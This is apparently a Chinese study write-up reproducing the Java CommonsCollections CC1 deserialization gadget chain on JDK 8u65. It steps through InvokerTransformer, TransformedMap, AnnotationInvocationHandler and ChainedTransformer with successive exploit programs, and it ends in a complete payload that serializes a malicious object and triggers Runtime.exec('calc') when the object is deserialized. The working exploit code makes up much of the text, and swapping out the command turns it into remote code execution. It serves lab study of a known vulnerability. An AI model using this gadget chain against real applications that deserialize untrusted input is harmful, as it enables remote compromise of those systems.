参考视频链接[Java反序列化CommonsCollections篇(一) CC1链手写EXP_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.1387.top_right_bar_window_history.content.click&vd_source=41fa125dd9ad7e3ca523f6b7394846c8)
参考文章[【Java反序列化】CommonsCollections-CC1链分析_cc1链源码-CSDN博客](https://blog.csdn.net/qq_48201589/article/details/136953041)
![[Drawing 2025-05-28 16.16.56.excalidraw|1800]]
复现环境 jdk8u65 cc链3.2.1  idea编辑器
这里有个大坑，jdk8u65需要将源码也下载下来，有些库是单纯的jar文件，这导致在使用idea查询使用方法的调用时会匹配不到，Java8u65对应的源码https://hg.openjdk.org/jdk8u/jdk8u/jdk/archive/af660750b2f4.zip，源码链接，jdk-af660750b2f4\src\share\classes\sun，把Java环境中的src.zip解压为jdk1.8.0_65\src，放入sun文件夹，并且在idea中导入src目录
![[Pasted image 20250530163853.png]]
首先正常java调用命令执行方法为
```java
Runtime r = Runtime.getRuntime();
r.exec("cacl");
```
利用反射执行调用
```java
Runtime r = Runtime.getRuntime();
Class c = Runtime.class;
Methpd m = c.getMethod("exec",String.class);
m.invoke(r,"cacl")
```
![[Pasted image 20250528164656.png]]

首先cc1链调用流程就是
反序列化触发某类的readObject()方法，然后该readObject()方法调用Transformer.transform()
实际上Transformer为 Apache Commons Collections 库中的一个接口
```java
package org.apache.commons.collections;  
  
/**  
 * Defines a functor interface implemented by classes that transform one * object into another. * <p>  
 * A <code>Transformer</code> converts the input object to the output object.  
 * The input object should be left unchanged. * Transformers are typically used for type conversions, or extracting data * from an object. * <p>  
 * Standard implementations of common transformers are provided by  
 * {@link TransformerUtils}. These include method invokation, returning a constant,  
 * cloning and returning the string value. ** @since Commons Collections 1.0  
 * @version $Revision: 646777 $ $Date: 2008-04-10 13:33:15 +0100 (Thu, 10 Apr 2008) $  
 ** @author James Strachan  
 * @author Stephen Colebourne  
 */public interface Transformer {  
  
    /**  
     * Transforms the input object (leaving it unchanged) into some output object.     *     * @param input  the object to be transformed, should be left unchanged  
     * @return a transformed object  
     * @throws ClassCastException (runtime) if the input is the wrong class  
     * @throws IllegalArgumentException (runtime) if the input is invalid  
     * @throws FunctorException (runtime) if the transform cannot be completed  
     */    public Object transform(Object input);  
  
}
```

而任何实现了transform方法的类，都可以实现接口Transform,从而在任何需要调用Transform的地方被调用
因此我们可以利用idea去快速定位 Apache Commons Collections 库哪些地方实现了此接口

点击红色指示即可查找实现此接口的类
![[Pasted image 20250528190017.png]]

依次查看这些实现Transformer接口的类，可以发现在InvokerTransformer类中实现的transform方法如下
```java
public Object transform(Object input) {  
    if (input == null) {  
        return null;  
    }  
    try {  
        Class cls = input.getClass();  
        Method method = cls.getMethod(iMethodName, iParamTypes);  
        return method.invoke(input, iArgs);  
              
    } catch (NoSuchMethodException ex) {  
        throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist");  
    } catch (IllegalAccessException ex) {  
        throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");  
    } catch (InvocationTargetException ex) {  
        throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);  
    }  
}
```
可以发现这是一种很标准的反射写法，并且此接口没有限制反射的对象，再查看iMethodName, iParamTypes参数是否可控，而这两个参数刚好是反射调用的类中方法以及方法执行所需参数。
这观察到构造方法刚好需要传递iMethodName, iParamTypes这两个参数，因此在InvokerTransformer类中可以实现rce
```java
public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {  
    super();  
    iMethodName = methodName;  
    iParamTypes = paramTypes;  
    iArgs = args;  
}
```
exp
```java
package org.example;  
import org.apache.commons.collections.functors.InvokerTransformer;  
  
  
import java.lang.reflect.Method;  
  
// 按两次 Shift 打开“随处搜索”对话框并输入 `show whitespaces`，  
// 然后按 Enter 键。现在，您可以在代码中看到空格字符。  
public class Main {  
    public static void main(String[] args) throws Exception {  
        Runtime runtime = Runtime.getRuntime();  
        InvokerTransformer exp = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});  
        exp.transform(runtime);  
  
    }  
}
```
![[Pasted image 20250528191604.png]]

现在的流程可以看作去找InvokerTransformer的上一层调用

![[Drawing 2025-05-28 19.16.19.excalidraw|1500]]

这里去寻找transformer方法调用的地方，同时需要可以实例化InvokerTransformer类

在TransformedMap类中发现了调用处
```java
//方法调用
protected Object checkSetValue(Object value) {  
    return valueTransformer.transform(value);  
}

//构造方法去实例化可以实现Transformer接口的类
protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {  
    super(map);  
    this.keyTransformer = keyTransformer;  
    this.valueTransformer = valueTransformer;  
}
//因为public权限修饰符可以被外部直接访问，同时此方法的作用是调用TransformedMap方法
public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {  
    return new TransformedMap(map, keyTransformer, valueTransformer);  
}
```
这时我们可以利用反射绕过权限修饰的特性
exp
```java
package org.example;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.TransformedMap;  
  
  
import java.lang.reflect.Method;  
import java.util.HashMap;  
import java.util.Map;  
  
// 按两次 Shift 打开“随处搜索”对话框并输入 `show whitespaces`，  
// 然后按 Enter 键。现在，您可以在代码中看到空格字符。  
public class Main {  
    public static void main(String[] args) throws Exception {  
        Runtime runtime = Runtime.getRuntime();  
  
//        InvokerTransformer exp = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});  
//        exp.transform(runtime);  
        Map<Object, Object> expMap = new HashMap<>();  
//        expMap.put("a", "b");  
        InvokerTransformer expTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});  
        Map<String, String> transformedMap = TransformedMap.decorate(expMap, null, expTransformer);  
        Class<?> clazz = transformedMap.getClass();  
        Method checkSetValueMethod = clazz.getDeclaredMethod("checkSetValue", Object.class);  
        checkSetValueMethod.setAccessible(true);  
        checkSetValueMethod.invoke(transformedMap, runtime);  
    }  
}
```
顺便解释下这里传入的构造方法，实际上目标只需要传递expTransformer这一个参数，其他参数不重要因为，我们需要调用的方法是checkSetValue方法，而这个方法只需要expTransformer这一个参数，同时这里直接调用decorate方法是因为public修饰符可以直接访问，而这个方法作用是直接实例化TransformedMap对象并且调用对应的构造方法（因为其构造方法为protected修饰无法直接外部调用）
![[Pasted image 20250528224439.png]]


当前流程可理解如下
![[Drawing 2025-05-28 22.46.32.excalidraw|1500]]
此时可以继续找到方法checkSetValue方法的调用处
再使用idea ctrl跟进方法的时候发现进入了TransformedMap其父类
AbstractInputCheckedMapDecorator，（而TransformedMap的方法checkSetValue是实例化对应的抽象方法checkSetValue），不必纠结这个点，我们观察其调用逻辑即可，发现有一个方法调用了checkSetValue方法
```java
    static class MapEntry extends AbstractMapEntryDecorator {  
  
        /** The parent map */  
        private final AbstractInputCheckedMapDecorator parent;  
  
        protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) {  
            super(entry);  
            this.parent = parent;  
        }  
  
        public Object setValue(Object value) {  
            value = parent.checkSetValue(value);  
            return entry.setValue(value);  
        }  
    }  
  
}
```
setValue 属于MapEntry此类下的方法，其作用为调用AbstractInputCheckedMapDecorator类方法checkSetValue对传入的value进行检查，（检查具体逻辑由继承子类实现，例如调用ransformedMap中的checkSetValue方法）最后给entry的值进行修改，entry其实就相当于python的字典，这里就可以写exp了
```java
package org.example;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.TransformedMap;  
  
  
  
import java.lang.reflect.Method;  
import java.util.HashMap;  
import java.util.Map;  
  
// 按两次 Shift 打开“随处搜索”对话框并输入 `show whitespaces`，  
// 然后按 Enter 键。现在，您可以在代码中看到空格字符。  
public class Main {  
    public static void main(String[] args) throws Exception {  
        Runtime runtime = Runtime.getRuntime();  
  
//        InvokerTransformer exp = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});  
//        exp.transform(runtime);  
        Map<Object, Object> expMap = new HashMap<>();  
        expMap.put("test", "test");  
        InvokerTransformer expTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});  
        Map<Object, Object> transformedMap = TransformedMap.decorate(expMap, null, expTransformer);  
  
        Map.Entry<Object, Object> entry = transformedMap.entrySet().iterator().next();  
        entry.setValue(runtime);  
//        Class<?> clazz = transformedMap.getClass();  
//        Method checkSetValueMethod = clazz.getDeclaredMethod("checkSetValue", Object.class);  
//        checkSetValueMethod.setAccessible(true);  
//        checkSetValueMethod.invoke(transformedMap, runtime);  
    }  
}
```
![[Pasted image 20250529120516.png]]
这里调用逻辑在于，通过调用Map.Entry中setValue方法去调用AbstractInputCheckedMapDecorator中的抽象方法checkSetValue,实际上就是调用了其子类TransformedMap中的checkSetValue方法。这里稍微解释一下
当抽象类的子类实现了抽象方法后，**调用该方法会执行子类的实现逻辑**，这是 Java 多态性的基础。只要子类正确实现了所有抽象方法，就可以放心地通过父类引用调用这些方法。
而这段代码是为了获取transformedMap的键值对，同时AbstractInputCheckedMapDecorator由创建map.entrySet()
```java
Map.Entry<Object, Object> entry = transformedMap.entrySet().iterator().next(); 
```

当前逻辑流程图

![[Drawing 2025-05-29 12.11.43.excalidraw|1500]]
这时我们可以继续查找AbstractInputCheckedMapDecorator中内部类MapEntry中的setValue方法被调用的点
依旧idea查看其调用点
![[Pasted image 20250530163434.png]]
发现了其调用处AnnotationInvocationHandler类
```java
private void readObject(java.io.ObjectInputStream s)  
    throws java.io.IOException, ClassNotFoundException {  
    s.defaultReadObject();  
  
    // Check to make sure that types have not evolved incompatibly  
  
    AnnotationType annotationType = null;  
    try {  
        annotationType = AnnotationType.getInstance(type);  
    } catch(IllegalArgumentException e) {  
        // Class is no longer an annotation type; time to punch out  
        throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");  
    }  
  
    Map<String, Class<?>> memberTypes = annotationType.memberTypes();  
  
    // If there are annotation members without values, that  
    // situation is handled by the invoke method.    for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {  
        String name = memberValue.getKey();  
        Class<?> memberType = memberTypes.get(name);  
        if (memberType != null) {  // i.e. member still exists  
            Object value = memberValue.getValue();  
            if (!(memberType.isInstance(value) ||  
                  value instanceof ExceptionProxy)) {  
                memberValue.setValue(  
                    new AnnotationTypeMismatchExceptionProxy(  
                        value.getClass() + "[" + value + "]").setMember(  
                            annotationType.members().get(name)));  
            }  
        }  
    }
```

我们可以发现，这个方法虽然可以调用setValue方法，但是有两个限制条件
```java
if (memberType != null)  //
```
（成员声明的类型）memberType变量非空
```java
!(memberType.isInstance(value) ||  
                  value instanceof ExceptionProxy)
```
当注解成员值的类型（value）与成员声明的类型（memberType）不匹配，且该值不是 ExceptionProxy 时，会触发类型校验逻辑即调用setValue
再查看整个类
```java
class AnnotationInvocationHandler implements InvocationHandler, Serializable {  
    private static final long serialVersionUID = 6182022883658399397L;  
    private final Class<? extends Annotation> type;  
    private final Map<String, Object> memberValues;  
  
    AnnotationInvocationHandler(Class<? extends Annotation> type, Map<String, Object> memberValues) {  
        Class<?>[] superInterfaces = type.getInterfaces();  
        if (!type.isAnnotation() ||  
            superInterfaces.length != 1 ||  
            superInterfaces[0] != java.lang.annotation.Annotation.class)  
            throw new AnnotationFormatError("Attempt to create proxy for a non-annotation type.");  
        this.type = type;  
        this.memberValues = memberValues;  
    }
```
可以发现其构造方法为默认权限修饰符，同时传递的两个参数类型为限定为注解类型的 Class 对象和键为成员名（String），值为成员值（Object）的映射map类型（泛型本质就是约束参数类型，而注解其实和python中的装饰器有些像，本质也是接口，隐式继承`java.lang.annotation.Annotation`接口，注解在编译后会被转换为继承Annotation接口的接口，JVM会在.class文件中为注解生成相应的元数据，运行时可以通过反射API读取这些注解信息
这里不必纠结）

并且其memberValues参数可控, 但是现在其实还有3个问题，第一个问题就是执行setValue需要上面的两个if条件，第二个Runtime类不可序列化，第三个问题是这里setValue方法中自带参数，不可控。
尝试解决第一个问题，首先可以在两个if语句下断点，看看对应的变量是如何执行的
当前payload
```java
package org.example;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.TransformedMap;  
  
  
import java.lang.annotation.Annotation;  
import java.lang.reflect.Method;  
import java.util.HashMap;  
import java.util.Map;  
import java.io.*;  
import java.lang.annotation.Retention;  
import java.lang.reflect.Constructor;  
import java.lang.reflect.InvocationHandler;  
import java.lang.reflect.Method;  
import java.util.HashMap;  
import java.util.Map;  
  
// 按两次 Shift 打开“随处搜索”对话框并输入 `show whitespaces`，  
// 然后按 Enter 键。现在，您可以在代码中看到空格字符。  
public class Main {  
    public static void main(String[] args) throws Exception {  
        Runtime runtime = Runtime.getRuntime();  
  
//        InvokerTransformer exp = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});  
//        exp.transform(runtime);  
        Map<Object, Object> expMap = new HashMap<>();  
        expMap.put("test", "test");  
        InvokerTransformer expTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});  
        Map<Object, Object> transformedMap = TransformedMap.decorate(expMap, null, expTransformer);  
  
//        Map.Entry<Object, Object> entry = transformedMap.entrySet().iterator().next();  
//        entry.setValue(runtime);  
        Class expClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
        Constructor<?> expClassConstructor = expClass.getDeclaredConstructor(Class.class, Map.class);  
        expClassConstructor.setAccessible(true);  
        Object expO = expClassConstructor.newInstance(Override.class, transformedMap);  
		  serialize(expO);  
			unserialize();
  
  
//        Class<?> clazz = transformedMap.getClass();  
//        Method checkSetValueMethod = clazz.getDeclaredMethod("checkSetValue", Object.class);  
//        checkSetValueMethod.setAccessible(true);  
//        checkSetValueMethod.invoke(transformedMap, runtime);  
    }  
    public  static void serialize(Object obj) throws IOException {  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));  
        oos.writeObject(obj);  
  
    }  
    public static Object unserialize() throws IOException, ClassNotFoundException {  
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("ser.bin"));  
        Object obj = ois.readObject();  
        return obj;  
    }  
}
```
这里是采用反射构造AnnotationInvocationHandler类并且调用对应的构造方法，再实例化类对象，最后采用反序列化调用其readObject()方法

![[Pasted image 20250531001019.png]]
然后这里断点调试就可以发现第一处调用时，memberType的值为空
![[Pasted image 20250531002825.png]]
而memberType实际上按照memberTypes这个map对象的键去取值，而name变量则为传入的transformedMap的键
```java
Class<?> memberType = memberTypes.get(name);
```
而memberTypes是传入的参数注解类型的 Class 对象的所有成员方法以及其返回类型作为键值对map，这里传入的是Override.class,而此注解无成员方法，因此memberTypes为空值
```java
AnnotationInvocationHandler.java
Map<String, Class<?>> memberTypes = annotationType.memberTypes();

main.java
Object expO = expClassConstructor.newInstance(Override.class, transformedMap);
```
![[Pasted image 20250531003940.png]]
这里发现override注解中还有注解，点击查看第一个注解@Target发现其中有对应的成员方法
```java
/*  
 * Copyright (c) 2003, 2013, Oracle and/or its affiliates. All rights reserved. * ORACLE PROPRIETARY/CONFIDENTIAL. Use is subject to license terms. * * * * * * * * * * * * * * * * * * * * */  
package java.lang.annotation;  
  

@Retention(RetentionPolicy.RUNTIME)  
@Target(ElementType.ANNOTATION_TYPE)  
public @interface Target {  
    /**  
     * Returns an array of the kinds of elements an annotation type     * can be applied to.     * @return an array of the kinds of elements an annotation type  
     * can be applied to     */    ElementType[] value();  
}
```
可以发现其成员方法为value,并且返回值为ElementType[]类型，因此这时memberTypes的值应该为
{"value":"ElementType[]"}（方便理解）实际如图
![[Pasted image 20250531005535.png]]
这时我们需要确保name为"value"即memberTypes这样才能保证memberType非空，可以正常获取值
```java
Class<?> memberType = memberTypes.get(name);
```
修改后payload,修改expMap.put("value", "test");  这
```java
package org.example;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.TransformedMap;  
  
  
import java.lang.annotation.Annotation;  
import java.lang.annotation.Target;  
import java.lang.reflect.Method;  
import java.util.HashMap;  
import java.util.Map;  
import java.io.*;  
import java.lang.annotation.Retention;  
import java.lang.reflect.Constructor;  
import java.lang.reflect.InvocationHandler;  
import java.lang.reflect.Method;  
import java.util.HashMap;  
import java.util.Map;  
  
// 按两次 Shift 打开“随处搜索”对话框并输入 `show whitespaces`，  
// 然后按 Enter 键。现在，您可以在代码中看到空格字符。  
public class Main {  
    public static void main(String[] args) throws Exception {  
        Runtime runtime = Runtime.getRuntime();  
  
//        InvokerTransformer exp = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});  
//        exp.transform(runtime);  
        Map<Object, Object> expMap = new HashMap<>();  
        expMap.put("value", "test");  
        InvokerTransformer expTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});  
        Map<Object, Object> transformedMap = TransformedMap.decorate(expMap, null, expTransformer);  
  
//        Map.Entry<Object, Object> entry = transformedMap.entrySet().iterator().next();  
//        entry.setValue(runtime);  
        Class expClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
        Constructor<?> expClassConstructor = expClass.getDeclaredConstructor(Class.class, Map.class);  
        expClassConstructor.setAccessible(true);  
        Object expO = expClassConstructor.newInstance(Target.class, transformedMap);  
  
        serialize(expO);  
        unserialize();  
  
//        Class<?> clazz = transformedMap.getClass();  
//        Method checkSetValueMethod = clazz.getDeclaredMethod("checkSetValue", Object.class);  
//        checkSetValueMethod.setAccessible(true);  
//        checkSetValueMethod.invoke(transformedMap, runtime);  
    }  
    public  static void serialize(Object obj) throws IOException {  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));  
        oos.writeObject(obj);  
  
    }  
    public static Object unserialize() throws IOException, ClassNotFoundException {  
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("ser.bin"));  
        Object obj = ois.readObject();  
        return obj;  
    }  
}
```
现在调试
可以发现以及达到了第一个if的条件
![[Pasted image 20250531010009.png]]
然后第二个条件就是value这个变量既不是memberType对象的实例，也不是ExceptionProxy的子类，而本身传递的map值为字符串，因此符合条件直接进入下一步从而调用setValue
![[Pasted image 20250531010734.png]]
而这时断点结束，同时解决了第一个问题调用setValue方法，后面直接返回报错
原因就在于第二个问题Runtime类无法直接反序列化，然后这个问题其实我认为要和最后一个问题一块解决即setValue无法直接控制参数
当前的传递流程为，反序列化出反射调用的AnnotationInvocationHandler类的实例对象，并且此类实例化时传递了参数Target.class(为了绕过if执行setValue而传递)和transformedMap(用来保证此map触发setValue即代码memberValue.setValue(Object)处),setValue调用checkSetValue方法，checkSetValue方法调用transformer方法
而InvokerTransformer调用transformer传值必须可控才能rce，那既然第一层setValue不可控，那能否实现找到一个transformer方法，在这个方法下修改传入的值然后将修改后的值作为参数，并且在这个方法里创建InvokerTransformer对象，并且调用它呢？
再次查看Transformer此接口，查询实现类并且此类需要实现transformer方法，这里发现了两个有帮助的类
ChainedTransformer
```java
构造方法
public ChainedTransformer(Transformer[] transformers) {  
    super();  
    iTransformers = transformers;  
}

transformer方法
public Object transform(Object object) {  
    for (int i = 0; i < iTransformers.length; i++) {  
        object = iTransformers[i].transform(object);  
    }  
    return object;  
}
```
可以发现此类构造方法接收一个Transformer类型数组，这意味着可以接收多个实现Transformer接口的类，此类的transform方法则是遍历整个transformer数组，然后调用每一个transformer实现类的transforme方法，并且将此方法的结果作为参数传递给下一个transformer实现类的transforme方法。

那这时如果我们反射调用AnnotationInvocationHandler类的并且传入的是ChainedTransformer类,这时setValue传入的值无法改变然后根据之前的逻辑链调用ChainedTransformer类的transformer方法，即使transformer方法传入的参数Object无法改变，但这里遍历的transform数组只要有一个transformer实现类的transforme方法可以修改object值，即可实现控制参数，然后在控制object参数后调用InvokerTransformer类的transform方法即可实现rce

而这里引入第二个transform接口实现类ConstantTransformer类
```java
构造方法
public ConstantTransformer(Object constantToReturn) {  
    super();  
    iConstant = constantToReturn;  
}

transform方法
public Object transform(Object input) {  
    return iConstant;  
}
```
构造方法是用变量iConstant存储一个传入的参数，transform方法则是无论传入的参数是什么，都只会返回iConstant
完美闭环，这下就完美解决setValue无法直接控制参数的问题
而Runtime无法直接序列化的问题则可以使用反射调用，而InvokeTransformer刚好可以进行反射，因此这个问题也能很好解决,并且刚好可以采用ChainedTransformer更加方便的链式联动调用每个InvokeTransformer反射的类，方法。
至此就可以写出exp
```java
package org.example;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.TransformedMap;  
import org.apache.commons.collections.Transformer;  
  
  
import java.lang.annotation.Annotation;  
import java.lang.annotation.Target;  
import java.lang.reflect.Method;  
import java.util.HashMap;  
import java.util.Map;  
import java.io.*;  
import java.lang.annotation.Retention;  
import java.lang.reflect.Constructor;  
import java.lang.reflect.InvocationHandler;  
import java.lang.reflect.Method;  
import java.util.HashMap;  
import java.util.Map;  
  
// 按两次 Shift 打开“随处搜索”对话框并输入 `show whitespaces`，  
// 然后按 Enter 键。现在，您可以在代码中看到空格字符。  
public class Main {  
    public static void main(String[] args) throws Exception {  
        Transformer [] transformers = new Transformer[]{  
                new ConstantTransformer( Runtime.class),  
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),  
                new InvokerTransformer("invoke",new Class[]{Object.class, Object[].class},new Object[]{null,null}),  
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})  
        };  
  
//        InvokerTransformer exp = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});  
//        exp.transform(runtime);  
        Map<Object, Object> expMap = new HashMap<>();  
        expMap.put("value", "test");  
        ChainedTransformer expTransformer = new ChainedTransformer(transformers);  
        Map<Object, Object> transformedMap = TransformedMap.decorate(expMap, null, expTransformer);  
  
//        Map.Entry<Object, Object> entry = transformedMap.entrySet().iterator().next();  
//        entry.setValue(runtime);  
        Class expClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
        Constructor<?> expClassConstructor = expClass.getDeclaredConstructor(Class.class, Map.class);  
        expClassConstructor.setAccessible(true);  
        Object expO = expClassConstructor.newInstance(Target.class, transformedMap);  
  
        serialize(expO);  
        unserialize();  
  
//        Class<?> clazz = transformedMap.getClass();  
//        Method checkSetValueMethod = clazz.getDeclaredMethod("checkSetValue", Object.class);  
//        checkSetValueMethod.setAccessible(true);  
//        checkSetValueMethod.invoke(transformedMap, runtime);  
    }  
    public  static void serialize(Object obj) throws IOException {  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));  
        oos.writeObject(obj);  
  
    }  
    public static Object unserialize() throws IOException, ClassNotFoundException {  
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("ser.bin"));  
        Object obj = ois.readObject();  
        return obj;  
    }  
}
```
这里重点解释一下这部分代码的作用，后面逻辑和前面一样
```java
Transformer [] transformers = new Transformer[]{  
        new ConstantTransformer( Runtime.class),  
        new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),  
        new InvokerTransformer("invoke",new Class[]{Object.class, Object[].class},new Object[]{null,null}),  
        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})  
};
ChainedTransformer expTransformer = new ChainedTransformer(transformers);
```
在调用expTransformer的transformer方法后，将调用创建的ConstantTransformer实例方法transformer方法直接返回固定值为Runtime.class，然后创建InvokerTransformer类并且将Runtime.class作为值传递，因此创建了getMethod方法并且将getRuntime作为参数执行调用，这时返回Method对象作为Object值，然后创建invoke返回Runtime实例，最终创建exec方法并且最终调用exec("calc")弹出计算器
![[Pasted image 20250601013344.png]]

至此完成cc1链的AnnotationInvocationHandler入口调用
总结调用链流程
```java
payload->
	readObject->
		AnnotationInvocationHandler->
		   Map->
		   setValue->
		   checkSetValue->
		   ChainedTransformer(transformers)->
		   ConstantTransformer(Runtime.class)->
		   InvokeTransformer.transformer->
		  Runtime.getRuntime().exec("calc");
```
```